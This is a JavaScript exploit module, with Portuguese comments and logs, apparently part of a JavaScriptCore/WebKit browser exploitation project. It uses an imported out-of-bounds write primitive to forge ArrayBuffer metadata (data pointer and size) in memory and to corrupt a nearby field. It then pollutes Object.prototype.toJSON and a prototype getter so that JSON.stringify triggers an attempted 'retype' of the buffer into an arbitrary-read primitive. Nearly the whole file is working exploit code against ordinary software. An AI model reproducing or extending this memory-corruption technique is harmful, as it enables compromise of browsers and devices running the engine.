// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let retype_getter_called_flag = false;
// retype_leak_attempt_results é uma variável global do módulo,
// o getter irá modificá-la diretamente.
let retype_leak_attempt_results = { success: false, message: "Getter não chamado ou teste não iniciado.", error: null };

const ENDERECO_INVALIDO_PARA_LEITURA_TESTE = new AdvancedInt64(0x1, 0x0);


class CheckpointObjectForRetype {
    constructor(id) {
        this.id = `RetypeCheckpoint-${id}`;
        this.marker = 0xD0D0D0D0;
    }
}

export function toJSON_TriggerRetypeCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";

    logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' é: ${Object.prototype.toString.call(this)}, id: ${this?.id}, é CheckpointObject?: ${this instanceof CheckpointObjectForRetype}`, "info", FNAME_toJSON);
    if (this instanceof CheckpointObjectForRetype) {
        logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' É uma instância de CheckpointObjectForRetype. Tentando acessar getter '${GETTER_CHECKPOINT_PROPERTY_NAME}' diretamente.`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
            logS3(`toJSON_TriggerRetypeCheckpointGetter: Acesso direto a this['${GETTER_CHECKPOINT_PROPERTY_NAME}'] completado.`, "info", FNAME_toJSON);
        } catch (e) {
            logS3(`toJSON_TriggerRetypeCheckpointGetter: Erro ao acessar diretamente this['${GETTER_CHECKPOINT_PROPERTY_NAME}']: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    // Retornar um valor simples ou undefined para evitar serialização complexa/recursiva pelo JSON.stringify
    // que poderia estar causando a segunda chamada com 'this' diferente.
    return this.id; // Ou return undefined; ou return {};
}


export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeRetypeOOB_AB_Test";
    logS3(`--- Iniciando Teste de "Re-Tipagem" do oob_array_buffer_real via ShadowCraft ---`, "test", FNAME_TEST);

    // Reseta o estado para cada execução do teste
    retype_getter_called_flag = false;
    retype_leak_attempt_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null };


    if (!JSC_OFFSETS.ArrayBufferContents /* ... mais verificações ... */ || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        logS3("Offsets críticos não definidos em config.mjs. Abortando.", "critical", FNAME_TEST);
        return;
    }
    const arrayBufferStructureID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
    if (arrayBufferStructureID !== 2 && arrayBufferStructureID !== 0x2) {
         logS3(`AVISO: ArrayBuffer_STRUCTURE_ID (${arrayBufferStructureID}) não é o esperado (2).`, "warn", FNAME_TEST);
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB. Abortando.", "critical", FNAME_TEST);
            // Atualiza o resultado global se falhar aqui
            retype_leak_attempt_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}, oob_dataview_real.byteLength: ${oob_dataview_real.byteLength}`, "info", FNAME_TEST);

        const shadow_metadata_offset_in_oob_data = 0x0;
        const arbitrary_read_size = new AdvancedInt64(0x1000, 0x0); // 4096

        logS3(`Escrevendo metadados sombra no offset de dados ${toHex(shadow_metadata_offset_in_oob_data)}...`, "info", FNAME_TEST);
        oob_write_absolute(
            shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START,
            arbitrary_read_size, 8
        );
        oob_write_absolute(
            shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START,
            ENDERECO_INVALIDO_PARA_LEITURA_TESTE, 8
        );
        logS3(`Metadados sombra: ptr=${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}, size=${arbitrary_read_size.toString(true)}`, "info", FNAME_TEST);

        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        logS3(`Escrita OOB gatilho: offset=${toHex(corruption_trigger_offset_abs)}, val=${corruption_value.toString(true)}`, "info", FNAME_TEST);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);

        const checkpoint_obj = new CheckpointObjectForRetype(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                retype_getter_called_flag = true; // Marcador crucial
                const FNAME_GETTER = "RetypeGetter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" foi CHAMADO em this.id = ${this?.id || 'N/A'}!`, "vuln", FNAME_GETTER);
                
                // Inicializa/reseta retype_leak_attempt_results aqui, no ponto de execução do getter
                retype_leak_attempt_results = { success: false, message: "Getter chamado, teste de re-tipagem em andamento.", error: null };

                // Teste 1: Tentar usar o oob_array_buffer_real original
                try {
                    logS3("DENTRO DO GETTER (Teste 1): DataView sobre oob_array_buffer_real...", "info", FNAME_GETTER);
                    const retyped_dv_original_ab = new DataView(oob_array_buffer_real);
                    logS3(`DENTRO DO GETTER (Teste 1): DV criada. ByteLength: ${retyped_dv_original_ab.byteLength}. Esperado (sombra): ${arbitrary_read_size.low()}`, "info", FNAME_GETTER);

                    if (retyped_dv_original_ab.byteLength === arbitrary_read_size.low()) {
                        logS3(`DENTRO DO GETTER (Teste 1): SUCESSO ESPECULATIVO! ByteLength CORRESPONDE (${arbitrary_read_size.low()}). Tentando ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}...`, "vuln", FNAME_GETTER);
                        // eslint-disable-next-line no-unused-vars
                        const valorLido = retyped_dv_original_ab.getUint32(0, true); // Tenta ler de 0x1
                        // Se não crashar, a leitura foi de um local inesperado ou 0x1 é mapeado.
                        retype_leak_attempt_results = { success: true, message: `Re-tipagem (Teste 1) PARECE ter funcionado (ByteLength ok), mas leitura de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} retornou ${toHex(valorLido)} SEM ERRO.`, error: null};
                        logS3(`DENTRO DO GETTER (Teste 1): Leitura de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} retornou ${toHex(valorLido)}. Verifique se é esperado.`, "leak", FNAME_GETTER);
                    } else {
                        logS3(`DENTRO DO GETTER (Teste 1): ByteLength (${retyped_dv_original_ab.byteLength}) NÃO corresponde ao esperado (${arbitrary_read_size.low()}). Lendo do buffer original...`, "warn", FNAME_GETTER);
                        // eslint-disable-next-line no-unused-vars
                        const valorLidoOriginal = retyped_dv_original_ab.getUint32(0, true);
                        retype_leak_attempt_results = { success: false, message: `Falha ao re-tipar oob_array_buffer_real (Teste 1). ByteLength (${retyped_dv_original_ab.byteLength}) != esperado (${arbitrary_read_size.low()}). Lido ${toHex(valorLidoOriginal)} do buffer original.`, error: null};
                        // logS3(`DENTRO DO GETTER (Teste 1): Leitura do buffer original (offset 0) retornou ${toHex(valorLidoOriginal)}.`, "info", FNAME_GETTER);
                    }
                } catch (e) {
                    logS3(`DENTRO DO GETTER (Teste 1): ERRO ao usar DataView sobre oob_ab ou ler: ${e.message}`, "error", FNAME_GETTER);
                    if (String(e.message).toLowerCase().includes("rangeerror") || String(e.message).toLowerCase().includes("memory access") || String(e.message).toLowerCase().includes("segmentation fault")) {
                        logS3(`DENTRO DO GETTER (Teste 1): O erro '${e.message}' é o CRASH CONTROLADO esperado ao tentar ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}!`, "vuln", FNAME_GETTER);
                        retype_leak_attempt_results = { success: true, message: `Re-tipagem de oob_array_buffer_real (Teste 1) PARECE ter funcionado, CRASH CONTROLADO '${e.message}' ao ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}.`, error: String(e) };
                    } else {
                         retype_leak_attempt_results = { success: false, message: `Erro inesperado no Teste 1: ${e.message}`, error: String(e) };
                    }
                }

                // Teste 2: Novo ArrayBuffer (mantido para observação)
                try {
                    logS3("DENTRO DO GETTER (Teste 2): Novo ArrayBuffer...", "info", FNAME_GETTER);
                    let newVictimAB = new ArrayBuffer(16);
                    const dvOnNewAB = new DataView(newVictimAB);
                    dvOnNewAB.setUint32(0, 0x12345678, true);
                    const readFromNew = dvOnNewAB.getUint32(0, true);
                    if (readFromNew === 0x12345678) {
                        logS3(`DENTRO DO GETTER (Teste 2): Leitura/Escrita no NOVO AB OK (${toHex(readFromNew)}).`, "good", FNAME_GETTER);
                    } else {
                         logS3(`DENTRO DO GETTER (Teste 2): Leitura/Escrita NOVO AB FALHOU. Lido: ${toHex(readFromNew)}`, "error", FNAME_GETTER);
                    }
                } catch (e) {
                     logS3(`DENTRO DO GETTER (Teste 2): Erro NOVO AB: ${e.message}`, "error", FNAME_GETTER);
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerRetypeCheckpointGetter,
            writable: true, enumerable: false, configurable: true
        });
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        let jsonResultString = "N/A";
        try {
            jsonResultString = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify completado. Retorno bruto: ${jsonResultString}`, "info", FNAME_TEST);
        } catch (e) {
            logS3(`Erro durante JSON.stringify(checkpoint_obj): ${e.message}`, "error", FNAME_TEST);
            // Se o getter não foi chamado e o erro foi aqui, é um problema diferente
            if (!retype_getter_called_flag) {
                 retype_leak_attempt_results.message = `Erro em JSON.stringify ANTES do getter: ${e.message}`;
            }
        }

    } catch (mainError) {
        logS3(`Erro principal no teste: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        retype_leak_attempt_results = { success: false, message: `Erro crítico no fluxo: ${mainError.message}`, error: String(mainError) };
    } finally {
        // Restauração da poluição
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
        if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
            if (originalGetterDesc) Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
            else delete CheckpointObjectForRetype.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
        }
         logS3("Limpeza de poluição finalizada.", "info", "CleanupFinal");
    }

    // Log final usa o retype_leak_attempt_results que foi modificado pelo getter
    if (retype_getter_called_flag) {
        if (retype_leak_attempt_results.success) {
            logS3(`RESULTADO DO TESTE DE RE-TIPAGEM: ${retype_leak_attempt_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO DO TESTE DE RE-TIPAGEM: Getter foi chamado, mas re-tipagem não confirmada. Detalhes: ${retype_leak_attempt_results.message}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO DO TESTE: Getter NÃO foi chamado. Tentativa de re-tipagem não verificada.", "error", FNAME_TEST);
        // Se o getter não foi chamado, retype_leak_attempt_results pode ainda ter sua mensagem de "getter não chamado"
        // ou uma mensagem de erro anterior se a falha ocorreu antes.
    }
    logS3(`  Detalhes finais da tentativa: ${JSON.stringify(retype_leak_attempt_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de "Re-Tipagem" (ShadowCraft) Concluído ---`, "test", FNAME_TEST);
}
